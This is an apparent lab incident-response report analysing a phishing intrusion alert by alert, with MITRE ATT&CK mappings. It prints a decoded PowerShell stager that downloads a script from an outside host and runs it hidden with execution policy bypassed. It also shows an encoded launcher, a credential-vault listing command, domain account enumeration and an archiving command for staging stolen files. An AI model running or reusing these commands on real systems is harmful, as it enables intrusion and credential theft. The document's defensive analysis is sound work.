Executive Summary

On October 23, 2026, a phishing email containing a malicious document (Q3_PressKit_Feedback.docm) was opened by a Marketing user on workstation THM-MSMITH. This led to the execution of a hidden, encoded PowerShell payload that established command-and-control (C2) communication, harvested local credentials, and enumerated domain accounts. The threat actor subsequently utilized the compromised service account svc-mktshare to move laterally to a second host, THM-SREYES, where they installed a malicious Windows service. Ultimately, the actor archived sensitive intellectual property (C:\Dev\NeuralNexus\Build\*) and exfiltrated it to external infrastructure.

Alert 1: Suspicious Child Process Spawned

High

1. Investigation Steps & Log Analysis

The initial alert fired when WINWORD.EXE spawned a child process. Initial investigation of the ai.exe process proved it to be a legitimate Microsoft AI host component. However, pivoting on the parent Process GUID revealed the true threat:

powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYA...
Sysmon EventCode 1 showing the hidden PowerShell execution alongside the benign ai.exe process.

2. Analysis & Decoding

The command line used -NoP (No Profile), -W Hidden (Hidden Window), and -Enc (Base64 encoded). Decoding the Base64 string revealed a download-and-execute stager:

$stager = "$env:TEMP\svchost_update.ps1"
(New-Object Net.WebClient).DownloadFile('http://payload-cdn.thm:8067/svchost_update.ps1', $stager)
Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`"" -WindowStyle Hidden

3. Verdict

True Positive. Malicious execution via a weaponized macro document.

4. MITRE ATT&CK Mapping

T1566.001 - Spearphishing Attachment T1059.001 - PowerShell T1027 - Obfuscated Files or Information

Alert 3: Anomalous Credential Vault Access

High

1. Investigation Steps & Log Analysis

A process execution alert showed vaultcmd.exe enumerating the Windows Credential Manager.

"C:\Windows\Sysnative\vaultcmd.exe" "/listcreds:Windows Credentials"

The Parent Process was identified as PID 9356, which was the second-stage PowerShell script (svchost_update.ps1) downloaded in Alert 1.

Note: The event was initially difficult to locate due to time-stamping offsets between the alert generation and the Sysmon log ingestion.

2. Verdict

True Positive. Credential Access. The attacker is harvesting saved credentials to facilitate lateral movement.

3. MITRE ATT&CK Mapping

T1555 - Credentials from Password Stores

Alert 4: Rapid Domain and Host Enumeration

High

"C:\Windows\system32\net.exe" user /domain

This command enumerates all user accounts in the Active Directory domain, allowing the attacker to map targets for lateral movement.

2. Verdict

True Positive. Domain Discovery.

"C:\Program Files\7-Zip\7z.exe" a -mx=1 C:\Windows\Temp\nx_build_beta.7z C:\Dev\NeuralNexus\Build\*
